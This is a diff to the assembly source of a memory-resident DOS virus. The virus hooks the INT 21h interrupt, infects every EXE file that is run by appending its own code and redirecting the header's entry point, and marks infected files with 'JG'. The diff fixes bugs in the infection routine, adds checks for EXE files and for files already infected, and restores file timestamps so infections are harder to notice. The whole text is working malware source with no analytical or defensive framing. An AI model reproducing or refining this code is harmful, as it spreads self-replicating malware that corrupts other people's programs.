@@ -23,8 +23,9 @@
 
 VirusSize	equ	EndVirus-BeginVirus
 ParagraphSize	equ	(VirusSize+15)/16
-VirusInterrupt	equ	0d7h				; Our interrupt
-VirusIdentifier	equ	0fed8h				; Our identifier
+VirusInterrupt	equ	7979h
+VirusHandshake	equ	'JG'
+ExeMarker	equ	'JG'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
@@ -32,16 +33,6 @@ VirusIdentifier	equ	0fed8h				; Our identifier
 
 BeginVirus:
 	jmp	EntryPoint
-
-EntryPoint:
-	push	ax
-	pop	ax
-	push	ax
-	pop	ax
-	call	@@delta
-@@delta:	pop	bp
-	sub	bp, offset @@delta
-	jmp	BeginNonEncryptedSection
 
 BeginNonEncryptedSection:
 	mov	ax, es
@@ -56,24 +47,24 @@ BeginNonEncryptedSection:
 	pop	ds
 
 	cld
-	mov	ah, VirusInterrupt			; Are we installed?
+	mov	ax, VirusInterrupt			; Check if in mem
 	jmp	@@next
 @@next:	int	21h
 	jc	InstallVirus				; Not there
-	cmp	ax, VirusIdentifier			; Check again...
+	cmp	ax, VirusHandshake
 	jne	InstallVirus
 	jmp	ExitVirus				; Exit program...
 
 InstallVirus:
-	mov	ah, 4ah					; Get #of free paras
-	mov	bx, 0ffffh				; in bx
+	mov	ah, 4ah					; Get size of mem
+	mov	bx, 0ffffh
 	int	21h
 
-	sub	bx, ParagraphSize+1			; change..
-	mov	ah, 4ah
+	sub	bx, ParagraphSize+1			; Make space for virus
+	mov	ah, 4ah					; Change size of mem
 	int	21h
 
-	mov	ah, 48h					; ..allocation.
+	mov	ah, 48h					; Allocate memory
 	mov	bx, ParagraphSize
 	int	21h
 	jc	ExitVirus
@@ -81,11 +72,12 @@ InstallVirus:
 	dec	ax					; ax-1 = MCB
 	mov	es, ax
 	mov	word ptr es:[1], 8h			; Mark DOS as owner
-	inc	ax
+
+	sub	ax, 0fh					; Compensate org 100h
 	mov	es, ax
 
-	lea	si, [bp+BeginVirus]
-	xor	di, di
+	mov	di, 100h
+	lea	si, [bp+offset BeginVirus]
 	mov	cx, VirusSize
 	rep	movsb					; Copy virus to mem
 
@@ -94,10 +86,10 @@ InstallInt21hHandler:
 	pop	ds
 	mov	ax, 3521h				; Hook old INT21h
 	int	21h
-	mov	word ptr ds:[Int21o-BeginVirus], bx
-	mov	word ptr ds:[Int21s-BeginVirus], es
+	mov	word ptr ds:[Int21o], bx
+	mov	word ptr ds:[Int21s], es
 
-	mov	dx, offset Int21hHandler-BeginVirus	; Set new int21h handler
+	mov	dx, offset Int21hHandler		; Set new int21h handler
 	mov	ax, 2521h
 	int	21h
 
@@ -115,11 +107,11 @@ ExeHead	db	22 dup (0)
 ;---------------------------------------------------------------------
 
 Int21hHandler:
-	cmp	ah, VirusInterrupt			; Is it our call?
+	cmp	ax, VirusInterrupt			; Return installation
 	jne	@@next
-	mov	ax, VirusIdentifier			; Tell 'em we're here
-	iret						; Jump back...
-@@next:	cmp	ax, 4b00h				; File executed?
+	mov	ax, VirusHandshake
+	iret
+@@next:	cmp	ax, 4b00h				; Execute?
 	jne	OldInt21h
 	call	InfectFile
 
@@ -145,72 +137,75 @@ InfectFile:
 	pop	es
 	cld
 
-	mov	ax, 3d02h				; Open the file..
+	mov	ax, 3d02h				; Open file
 	int	21h
-
+	jnc	@@opened
+	jmp	DoneInfect
+@@opened:
 	mov	bx, ax					; File handle in bx
 
 	push	cs
 	pop	ds					; The actual segment
 
-	mov	ax, 5700h				; Get date/time
+	mov	ax, 5700h				; Get time/date
 	int	21h
-	mov	word ptr ds:[ExeDate-100h], dx
-	mov	word ptr ds:[ExeTime-100h], cx
+	mov	word ptr ds:[ExeDate], dx
+	mov	word ptr ds:[ExeTime], cx
 
 InfectExeFile:
-	mov	ax, 4200h				; Position file-pointer to BOF
-	xor	cx, cx
-	xor	dx, dx
-	int	21h
+	xor	al, al					; Go SOF
+	call	SetFilePointer
 
 	mov	ah, 3fh					; read file - 28 bytes
 	mov	cx, 28					; to ExeHead
-	mov	dx, offset ExeHead-100h
+	mov	dx, offset ExeHead
 	int	21h
 
-	mov	ax, 4202h				; Go EOF
-	xor	cx, cx
-	xor	dx, dx
-	int	21h
+	cmp	word ptr ds:[ExeHead], 'ZM'		; Check if .EXE file
+	je	@@check_infected
+	cmp	word ptr ds:[ExeHead], 'MZ'
+	jne	CloseFile
+
+@@check_infected:
+	cmp	word ptr ds:[ExeHead+12h], ExeMarker	; Already infected?
+	je	CloseFile
+
+	mov	al, 2h					; Go EOF
+	call	SetFilePointer
 
 	push	dx
 	push	ax
 
-	mov	ah, 40h					; Write virus to EOF
-	mov	cx, VirusSize
-	mov	dx, offset BeginVirus-0100h
-	int	21h
+	call	WriteVirus
 
-	mov	ax, 4202h				; Get NEW filelength.
-	xor	cx, cx
-	xor	dx, dx
-	int	21h
+	mov	al, 2h					; Get NEW filelength.
+	call	SetFilePointer
 
 	mov	cx, 512
 	div	cx
+	or	dx, dx
+	jz	@@exact
 	inc	ax
-	mov	word ptr ds:[ExeHead-100h+2h], dx
-	mov	word ptr ds:[ExeHead-100h+4h], ax
+@@exact:mov	word ptr ds:[ExeHead+2h], dx
+	mov	word ptr ds:[ExeHead+4h], ax
 
 	pop	ax
 	pop	dx
 
 	mov	cx, 16
 	div	cx
-	sub	ax, word ptr ds:[ExeHead-100h+8h]
-	mov	word ptr ds:[ExeHead-100h+16h], ax
-	mov	word ptr ds:[ExeHead-100h+14h], dx
-	mov	word ptr ds:[ExeHead-100h+12h], 'RI'
+	sub	ax, word ptr ds:[ExeHead+8h]
+	add	dx, offset EntryPoint-BeginVirus
+	mov	word ptr ds:[ExeHead+16h], ax
+	mov	word ptr ds:[ExeHead+14h], dx
+	mov	word ptr ds:[ExeHead+12h], ExeMarker
 
-	mov	ax, 4200h				; Position file-pointer to BOF
-	xor	cx, cx
-	xor	dx, dx
-	int	21h
+	xor	al, al					; Go SOF
+	call	SetFilePointer
 
 	mov	ah, 40h					; Write header
 	mov	cx, 28
-	mov	dx, offset ExeHead-100h
+	mov	dx, offset ExeHead
 	int	21h
 
 	jmp	CloseFile
@@ -219,14 +214,15 @@ CloseFile:
 	push	cs
 	pop	ds
 
-	mov	ax, 5701h				; Restore date...
-	mov	cx, word ptr ds:[ExeTime-100h]
-	mov	dx, word ptr ds:[ExeDate-100h]
+	mov	ax, 5701h				; Restore time/date
+	mov	cx, word ptr ds:[ExeTime]
+	mov	dx, word ptr ds:[ExeDate]
 	int	21h
 
-	mov	ah, 3eh					; Close file..
+	mov	ah, 3eh					; Close file
 	int	21h
 
+DoneInfect:
 	pop	bp
 	pop	es
 	pop	ds
@@ -238,6 +234,34 @@ CloseFile:
 
 ExeTime	dw	0
 ExeDate	dw	0
+
+;---------------------------------------------------------------------
+;	Helper functions
+;---------------------------------------------------------------------
+
+SetFilePointer:
+	mov	ah, 42h					; Jump in file
+	xor	cx, cx
+	cwd
+	int	21h
+	ret
+
+WriteVirus:
+	mov	ah, 40h					; Write virus to file
+	mov	cx, VirusSize
+	mov	dx, offset BeginVirus
+	int	21h
+	ret
+
+EntryPoint:
+	push	ax
+	pop	ax
+	push	ax
+	pop	ax
+	call	@@delta
+@@delta:pop	bp
+	sub	bp, offset @@delta
+	jmp	BeginNonEncryptedSection
 
 EndVirus:
 
